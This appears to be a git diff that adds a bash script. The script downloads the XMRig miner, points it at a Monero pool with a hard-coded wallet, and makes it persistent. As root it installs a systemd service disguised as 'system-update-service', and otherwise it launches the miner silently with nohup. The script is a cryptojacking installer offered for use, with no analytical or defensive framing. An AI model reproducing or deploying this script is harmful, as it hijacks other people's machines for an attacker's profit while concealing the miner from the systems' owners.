[32m+[m[32m#!/bin/bash[m
[32m+[m
[32m+[m[32m# Configuration[m
[32m+[m[32mTAR_FILE="kal.tar.gz"[m
[32m+[m[32mEXTRACT_DIR="xmrig-6.24.0"[m
[32m+[m[32mBINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"[m
[32m+[m[32mARGS="--url pool.hashvault.pro:443 --user 88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ --pass next --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"[m
[32m+[m[32mSERVICE_NAME="system-update-service"[m
[32m+[m
[32m+[m[32m# Download and setup if not already present[m
[32m+[m[32mif [ ! -f "$BINARY_PATH" ]; then[m
[32m+[m[32m    curl -L -o "$TAR_FILE" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz[m
[32m+[m[32m    tar xvzf "$TAR_FILE"[m
[32m+[m[32mfi[m
[32m+[m
[32m+[m[32mchmod +x "$BINARY_PATH"[m
[32m+[m
[32m+[m[32m# Attempt systemd setup[m
[32m+[m[32mINSTALLED_SYSTEMD=0[m
[32m+[m[32mif [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then[m
[32m+[m[32m    echo "Root privileges detected. Attempting systemd setup..."[m
[32m+[m[41m    [m
[32m+[m[32m    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"[m
[32m+[m[41m    [m
[32m+[m[32m    cat <<EOF > "$SERVICE_FILE"[m
[32m+[m[32m[Unit][m
[32m+[m[32mDescription=System Update Service[m
[32m+[m[32mAfter=network.target[m
[32m+[m
[32m+[m[32m[Service][m
[32m+[m[32mType=simple[m
[32m+[m[32mExecStart=${BINARY_PATH} ${ARGS}[m
[32m+[m[32mRestart=always[m
[32m+[m[32mRestartSec=10[m
[32m+[m[32mUser=root[m
[32m+[m
[32m+[m[32m[Install][m
[32m+[m[32mWantedBy=multi-user.target[m
[32m+[m[32mEOF[m
[32m+[m
[32m+[m[32m    systemctl daemon-reload[m
[32m+[m[32m    systemctl enable "$SERVICE_NAME"[m
[32m+[m[32m    systemctl start "$SERVICE_NAME"[m
[32m+[m[41m    [m
[32m+[m[32m    if systemctl is-active --quiet "$SERVICE_NAME"; then[m
[32m+[m[32m        echo "Service started via systemd."[m
[32m+[m[32m        INSTALLED_SYSTEMD=1[m
[32m+[m[32m    fi[m
[32m+[m[32mfi[m
[32m+[m
[32m+[m[32m# Fallback to nohup[m
[32m+[m[32mif [ $INSTALLED_SYSTEMD -eq 0 ]; then[m
[32m+[m[32m    echo "Starting with nohup..."[m
[32m+[m[32m    nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &[m
[32m+[m[32mfi[m
